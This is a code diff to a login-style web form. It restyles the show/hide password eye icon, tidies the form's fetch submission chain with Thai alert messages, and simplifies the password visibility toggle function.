@@ -83,12 +83,14 @@
       border: none;
       cursor: pointer;
       padding: 0;
+      width: 24px;
+      height: 24px;
     }
 
     .toggle-password svg {
-      width: 24px;
-      height: 24px;
-      fill: #888;
+      width: 100%;
+      height: 100%;
+      fill: #555;
     }
 
     button[type="submit"] {
@@ -122,9 +124,10 @@
         <div class="password-wrapper">
           <input type="password" id="password" name="password" placeholder="Password" required />
           <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle password visibility">
-            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-              <path d="M12 4.5C7 4.5 2.7 8 1 12c1.7 4 6 7.5 11 7.5s9.3-3.5 11-7.5c-1.7-4-6-7.5-11-7.5zm0 13c-3 0-5.5-2.5-5.5-5.5S9 6.5 12 6.5 17.5 9 17.5 12 15 17.5 12 17.5z"/>
-              <circle cx="12" cy="12" r="2.5"/>
+            <svg id="eye-icon" viewBox="0 0 64 64">
+              <path d="M32 16C20 16 8.6 24 4 32c4.6 8 16 16 28 16s23.4-8 28-16c-4.6-8-16-16-28-16zm0 28c-6.6 0-12-5.4-12-12s5.4-12 12-12 12 5.4 12 12-5.4 12-12 12z"/>
+              <circle cx="32" cy="32" r="6"/>
+              <path d="M25 10c2 2 3 4 4 6M39 10c-2 2-3 4-4 6" stroke="#555" stroke-width="2" fill="none"/>
             </svg>
           </button>
         </div>
@@ -150,33 +153,24 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password }),
       })
-      .then(res => res.text())
-      .then(data => {
-        alert("ส่งข้อมูลสำเร็จแล้ว!");
-        form.reset();
-      })
-      .catch(err => {
-        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
-        console.error(err);
-      });
+        .then(res => res.text())
+        .then(() => {
+          alert("ส่งข้อมูลสำเร็จแล้ว!");
+          form.reset();
+        })
+        .catch(err => {
+          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+          console.error(err);
+        });
     });
 
     function togglePassword() {
       const type = passwordInput.type === "password" ? "text" : "password";
       passwordInput.type = type;
 
-      // เปลี่ยนตาแบบ SVG ขนตาน่ารัก
-      if (type === "text") {
-        eyeIcon.innerHTML = `
-          <path d="M12 4.5C7 4.5 2.7 8 1 12c1.7 4 6 7.5 11 7.5s9.3-3.5 11-7.5c-1.7-4-6-7.5-11-7.5z" fill="#888"/>
-          <path d="M12 15c-1.7 0-3-1.3-3-3s1.3-3 3-3 3 1.3 3 3-1.3 3-3 3z" fill="#fff"/>
-        `;
-      } else {
-        eyeIcon.innerHTML = `
-          <path d="M12 4.5C7 4.5 2.7 8 1 12c1.7 4 6 7.5 11 7.5s9.3-3.5 11-7.5c-1.7-4-6-7.5-11-7.5zm0 13c-3 0-5.5-2.5-5.5-5.5S9 6.5 12 6.5 17.5 9 17.5 12 15 17.5 12 17.5z"/>
-          <circle cx="12" cy="12" r="2.5"/>
-        `;
-      }
+      eyeIcon.innerHTML = type === "password"
+        ? `<path d="M32 16C20 16 8.6 24 4 32c4.6 8 16 16 28 16s23.4-8 28-16c-4.6-8-16-16-28-16zm0 28c-6.6 0-12-5.4-12-12s5.4-12 12-12 12 5.4 12 12-5.4 12-12 12z"/><circle cx="32" cy="32" r="6"/><path d="M25 10c2 2 3 4 4 6M39 10c-2 2-3 4-4 6" stroke="#555" stroke-width="2" fill="none"/>`
+        : `<path d="M4 32c4.6-8 16-16 28-16s23.4 8 28 16c-4.6 8-16 16-28 16S8.6 40 4 32z"/><path d="M44 44L20 20" stroke="#555" stroke-width="3"/>`;
     }
   </script>
 </body>
